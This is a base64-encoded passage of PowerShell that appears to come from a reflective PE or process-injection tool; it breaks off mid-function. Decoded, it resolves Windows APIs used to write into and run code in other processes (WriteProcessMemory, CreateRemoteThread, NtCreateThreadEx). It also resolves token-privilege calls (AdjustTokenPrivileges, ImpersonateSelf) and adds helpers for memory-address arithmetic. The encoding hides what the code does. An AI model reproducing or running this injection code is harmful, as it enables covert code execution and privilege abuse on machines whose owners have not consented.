ZSBHZXRQcm9jQWRkcmVzcyAtVmFsdWUgJEdldFByb2NBZGRyZXNzCiAgICAgICAgCiAgICAgICAgJEdldFByb2NBZGRyZXNzSW50UHRyQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0UHJvY0FkZHJlc3MgI1RoaXMgaXMgc3RpbGwgR2V0UHJvY0FkZHJlc3MsIGJ1dCBpbnN0ZWFkIG9mIFBvd2VyU2hlbGwgY29udmVydGluZyB0aGUgc3RyaW5nIHRvIGEgcG9pbnRlciwgeW91IG11c3QgZG8gaXQgeW91cnNlbGYKICAgICAgICAkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkR2V0UHJvY0FkZHJlc3NJbnRQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0UHJvY0FkZHJlc3NJbnRQdHJBZGRyLCAkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRQcm9jQWRkcmVzc0ludFB0ciAtVmFsdWUgJEdldFByb2NBZGRyZXNzSW50UHRyCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsRnJlZSAtVmFsdWUgJFZpcnR1YWxGcmVlCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZUV4CiAgICAgICAgJFZpcnR1YWxGcmVlRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxGcmVlRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVFeEFkZHIsICRWaXJ0dWFsRnJlZUV4RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEZyZWVFeCAtVmFsdWUgJFZpcnR1YWxGcmVlRXgKICAgICAgICAKICAgICAgICAkVmlydHVhbFByb3RlY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdAogICAgICAgICRWaXJ0dWFsUHJvdGVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxQcm90ZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxQcm90ZWN0QWRkciwgJFZpcnR1YWxQcm90ZWN0RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbFByb3RlY3QgLVZhbHVlICRWaXJ0dWFsUHJvdGVjdAogICAgICAgIAogICAgICAgICRHZXRNb2R1bGVIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRNb2R1bGVIYW5kbGVBCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRNb2R1bGVIYW5kbGVBZGRyLCAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgR2V0TW9kdWxlSGFuZGxlIC1WYWx1ZSAkR2V0TW9kdWxlSGFuZGxlCiAgICAgICAgCiAgICAgICAgJEZyZWVMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRnJlZUxpYnJhcnkKICAgICAgICAkRnJlZUxpYnJhcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbQm9vbF0pIChbSW50UHRyXSkKICAgICAgICAkRnJlZUxpYnJhcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRnJlZUxpYnJhcnlBZGRyLCAkRnJlZUxpYnJhcnlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGcmVlTGlicmFyeSAtVmFsdWUgJEZyZWVMaWJyYXJ5CiAgICAgICAgCiAgICAgICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE9wZW5Qcm9jZXNzIC1WYWx1ZSAkT3BlblByb2Nlc3MKICAgICAgICAKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSkgKFtVSW50MzJdKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyLCAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFdhaXRGb3JTaW5nbGVPYmplY3QgLVZhbHVlICRXYWl0Rm9yU2luZ2xlT2JqZWN0CiAgICAgICAgCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgV3JpdGVQcm9jZXNzTWVtb3J5IC1WYWx1ZSAkV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgCiAgICAgICAgJFJlYWRQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgUmVhZFByb2Nlc3NNZW1vcnkKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFJlYWRQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFJlYWRQcm9jZXNzTWVtb3J5QWRkciwgJFJlYWRQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUmVhZFByb2Nlc3NNZW1vcnkgLVZhbHVlICRSZWFkUHJvY2Vzc01lbW9yeQogICAgICAgIAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgQ3JlYXRlUmVtb3RlVGhyZWFkIC1WYWx1ZSAkQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgCiAgICAgICAgJEdldEV4aXRDb2RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0RXhpdENvZGVUaHJlYWQKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJEdldEV4aXRDb2RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEV4aXRDb2RlVGhyZWFkQWRkciwgJEdldEV4aXRDb2RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0RXhpdENvZGVUaHJlYWQgLVZhbHVlICRHZXRFeGl0Q29kZVRocmVhZAogICAgICAgIAogICAgICAgICRPcGVuVGhyZWFkVG9rZW5BZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBPcGVuVGhyZWFkVG9rZW4KICAgICAgICAkT3BlblRocmVhZFRva2VuRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbQm9vbF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkT3BlblRocmVhZFRva2VuID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5UaHJlYWRUb2tlbkFkZHIsICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBPcGVuVGhyZWFkVG9rZW4gLVZhbHVlICRPcGVuVGhyZWFkVG9rZW4KICAgICAgICAKICAgICAgICAkR2V0Q3VycmVudFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldEN1cnJlbnRUaHJlYWQKICAgICAgICAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICRHZXRDdXJyZW50VGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEN1cnJlbnRUaHJlYWRBZGRyLCAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldEN1cnJlbnRUaHJlYWQgLVZhbHVlICRHZXRDdXJyZW50VGhyZWFkCiAgICAgICAgCiAgICAgICAgJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIEFkanVzdFRva2VuUHJpdmlsZWdlcwogICAgICAgICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIsICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBZGp1c3RUb2tlblByaXZpbGVnZXMgLVZhbHVlICRBZGp1c3RUb2tlblByaXZpbGVnZXMKICAgICAgICAKICAgICAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBMb29rdXBQcml2aWxlZ2VWYWx1ZUEKICAgICAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIsICRMb29rdXBQcml2aWxlZ2VWYWx1ZURlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExvb2t1cFByaXZpbGVnZVZhbHVlIC1WYWx1ZSAkTG9va3VwUHJpdmlsZWdlVmFsdWUKICAgICAgICAKICAgICAgICAkSW1wZXJzb25hdGVTZWxmQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgSW1wZXJzb25hdGVTZWxmCiAgICAgICAgJEltcGVyc29uYXRlU2VsZkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJEltcGVyc29uYXRlU2VsZiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJbXBlcnNvbmF0ZVNlbGZBZGRyLCAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSW1wZXJzb25hdGVTZWxmIC1WYWx1ZSAkSW1wZXJzb25hdGVTZWxmCiAgICAgICAgCiAgICAgICAgIyBOdENyZWF0ZVRocmVhZEV4IGlzIG9ubHkgZXZlciBjYWxsZWQgb24gVmlzdGEgYW5kIFdpbjcuIE50Q3JlYXRlVGhyZWFkRXggaXMgbm90IGV4cG9ydGVkIGJ5IG50ZGxsLmRsbCBpbiBXaW5kb3dzIFhQCiAgICAgICAgaWYgKChbRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbiAtZ2UgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMCkpIC1hbmQgKFtFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uIC1sdCAoTmV3LU9iamVjdCAnVmVyc2lvbicgNiwyKSkpIHsKCQkgICAgJE50Q3JlYXRlVGhyZWFkRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIE50RGxsLmRsbCBOdENyZWF0ZVRocmVhZEV4CiAgICAgICAgICAgICROdENyZWF0ZVRocmVhZEV4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtCb29sXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbVUludDMyXSkKICAgICAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTnRDcmVhdGVUaHJlYWRFeEFkZHIsICROdENyZWF0ZVRocmVhZEV4RGVsZWdhdGUpCgkJICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50Q3JlYXRlVGhyZWFkRXggLVZhbHVlICROdENyZWF0ZVRocmVhZEV4CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRJc1dvdzY0UHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgS2VybmVsMzIuZGxsIElzV293NjRQcm9jZXNzCiAgICAgICAgJElzV293NjRQcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSXNXb3c2NFByb2Nlc3MgLVZhbHVlICRJc1dvdzY0UHJvY2VzcwogICAgICAgIAogICAgICAgICRDcmVhdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIEtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVRocmVhZEFkZHIsICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBDcmVhdGVUaHJlYWQgLVZhbHVlICRDcmVhdGVUaHJlYWQKICAgICAgICAKICAgICAgICByZXR1cm4gJFdpbjMyRnVuY3Rpb25zCiAgICB9CiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgogICAgICAgICAgICAKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMjICAgIEhFTFBFUlMgICAjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiAgICAjUG93ZXJzaGVsbCBvbmx5IGRvZXMgc2lnbmVkIGFyaXRobWV0aWMsIHNvIGlmIHdlIHdhbnQgdG8gY2FsY3VsYXRlIG1lbW9yeSBhZGRyZXNzZXMgd2UgaGF2ZSB0byB1c2UgdGhpcyBmdW5jdGlvbgogICAgI1RoaXMgd2lsbCBhZGQgc2lnbmVkIGludGVnZXJzIGFzIGlmIHRoZXkgd2VyZSB1bnNpZ25lZCBpbnRlZ2VycyBzbyB3ZSBjYW4gYWNjdXJhdGVseSBjYWxjdWxhdGUgbWVtb3J5IGFkZHJlc3NlcwogICAgRnVuY3Rpb24gU3ViLVNpZ25lZEludEFzVW5zaWduZWQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUxLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTIKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQogICAgICAgIFtCeXRlW11dJEZpbmFsQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW1VJbnQ2NF0wKQoKICAgICAgICBpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCiAgICAgICAgewogICAgICAgICAgICAkQ2FycnlPdmVyID0gMAogICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRWYWx1ZTFCeXRlcy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFZhbCA9ICRWYWx1ZTFCeXRlc1skaV0gLSAkQ2FycnlPdmVyCiAgICAgICAgICAgICAgICAjU3ViIGJ5dGVzCiAgICAgICAgICAgICAgICBpZiAoJFZhbCAtbHQgJFZhbHVlMkJ5dGVzWyRpXSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVmFsICs9IDI1NgogICAgICAgICAgICAgICAgICAgICRDYXJyeU92ZXIgPSAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBbVUludDE2XSRTdW0gPSAkVmFsIC0gJFZhbHVlMkJ5dGVzWyRpXQoKICAgICAgICAgICAgICAgICRGaW5hbEJ5dGVzWyRpXSA9ICRTdW0gLWJhbmQgMHgwMEZGCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNhbm5vdCBzdWJ0cmFjdCBieXRlYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplcyIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuIFtCaXRDb252ZXJ0ZXJdOjpUb0ludDY0KCRGaW5hbEJ5dGVzLCAwKQogICAgfQogICAgCgogICAgRnVuY3Rpb24gQWRkLVNpZ25lZEludEFzVW5zaWduZWQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUxLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTIKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQogICAgICAgIFtCeXRlW11dJEZpbmFsQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW1VJbnQ2NF0wKQoKICAgICAgICBpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCiAgICAgICAgewogICAgICAgICAgICAkQ2FycnlPdmVyID0gMAogICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRWYWx1ZTFCeXRlcy5Db3VudDsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0FkZCBieXRlcwogICAgICAgICAgICAgICAgW1VJbnQxNl0kU3VtID0gJFZhbHVlMUJ5dGVzWyRpXSArICRWYWx1ZTJCeXRlc1skaV0gKyAkQ2FycnlPdmVyCgogICAgICAgICAgICA